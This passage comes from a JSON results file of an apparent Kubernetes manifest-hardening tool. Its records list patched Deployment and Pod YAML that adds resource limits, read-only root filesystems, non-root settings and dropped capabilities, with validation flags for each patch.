    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01321",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01322",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01323",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n      requests:\n        cpu: 100m\n        memory: 128Mi\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01324",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n      requests:\n        cpu: 100m\n        memory: 128Mi\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01325",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n      requests:\n        cpu: 100m\n        memory: 128Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01326",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:stable\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "01327",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:stable\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "01328",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": false,
    "patched_yaml": null,
    "errors": []
  },
  {
    "id": "01329",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:stable\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "01330",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:stable\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "errors": []
  },
  {
    "id": "01331",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01332",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01333",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01334",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01335",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: webapp\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      serviceAccountName: webapp\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 34577c\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01336",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: webapp\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      serviceAccountName: webapp\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 34577c\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01337",
    "policy_id": "env_var_secret",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-pipelines-webhook\n  namespace: tekton-pipelines\n  labels:\n    app.kubernetes.io/name: webhook\n    app.kubernetes.io/component: webhook\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.18.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.18.0\n    version: v0.18.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: webhook\n      app.kubernetes.io/component: webhook\n      app.kubernetes.io/instance: default\n      app.kubernetes.io/part-of: tekton-pipelines\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n      labels:\n        app.kubernetes.io/name: webhook\n        app.kubernetes.io/component: webhook\n        app.kubernetes.io/instance: default\n        app.kubernetes.io/version: v0.18.0\n        app.kubernetes.io/part-of: tekton-pipelines\n        pipeline.tekton.dev/release: v0.18.0\n        app: tekton-pipelines-webhook\n        version: v0.18.0\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: webhook\n                  app.kubernetes.io/component: webhook\n                  app.kubernetes.io/instance: default\n                  app.kubernetes.io/part-of: tekton-pipelines\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: tekton-pipelines-webhook\n      containers:\n      - name: webhook\n        image: gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/webhook:v0.18.0@sha256:622f9d84bc56c12e883f4e5a3936d1321ed369655ea88dc8f7ab61c0108f72dd\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: CONFIG_LEADERELECTION_NAME\n          value: config-leader-election\n        - name: WEBHOOK_SERVICE_NAME\n          value: tekton-pipelines-webhook\n        - name: WEBHOOK_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: webhook-secret-name-secret\n              key: webhook_secret_name\n        - name: METRICS_DOMAIN\n          value: tekton.dev/pipeline\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsUser: 65532\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        - name: https-webhook\n          containerPort: 8443\n        - name: probes\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n",
    "errors": []
  },
  {
    "id": "01338",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-pipelines-webhook\n  namespace: tekton-pipelines\n  labels:\n    app.kubernetes.io/name: webhook\n    app.kubernetes.io/component: webhook\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.18.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.18.0\n    version: v0.18.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: webhook\n      app.kubernetes.io/component: webhook\n      app.kubernetes.io/instance: default\n      app.kubernetes.io/part-of: tekton-pipelines\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n      labels:\n        app.kubernetes.io/name: webhook\n        app.kubernetes.io/component: webhook\n        app.kubernetes.io/instance: default\n        app.kubernetes.io/version: v0.18.0\n        app.kubernetes.io/part-of: tekton-pipelines\n        pipeline.tekton.dev/release: v0.18.0\n        app: tekton-pipelines-webhook\n        version: v0.18.0\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: webhook\n                  app.kubernetes.io/component: webhook\n                  app.kubernetes.io/instance: default\n                  app.kubernetes.io/part-of: tekton-pipelines\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: tekton-pipelines-webhook\n      containers:\n      - name: webhook\n        image: gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/webhook:v0.18.0@sha256:622f9d84bc56c12e883f4e5a3936d1321ed369655ea88dc8f7ab61c0108f72dd\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: CONFIG_LEADERELECTION_NAME\n          value: config-leader-election\n        - name: WEBHOOK_SERVICE_NAME\n          value: tekton-pipelines-webhook\n        - name: WEBHOOK_SECRET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: webhook-secret-name-secret\n              key: webhook_secret_name\n        - name: METRICS_DOMAIN\n          value: tekton.dev/pipeline\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsUser: 65532\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          runAsNonRoot: true\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        - name: https-webhook\n          containerPort: 8443\n        - name: probes\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n",
    "errors": []
  },
  {
    "id": "01339",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:stable\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01340",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test-deployment\n  labels:\n    app: test-deployment\nspec:\n  selector:\n    matchLabels:\n      app: test-deployment\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: test-deployment\n    spec:\n      containers:\n      - name: tester\n        image: ubuntu:stable\n        command:\n        - bash\n        - -c\n        - 'echo \"Falling asleep for $SECS_TO_SLEEP\"\n\n          sleep $SECS_TO_SLEEP\n\n          '\n        env:\n        - name: SECS_TO_SLEEP\n          value: '1000'\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01341",
    "policy_id": "run_as_non_root",
    "accepted": true,
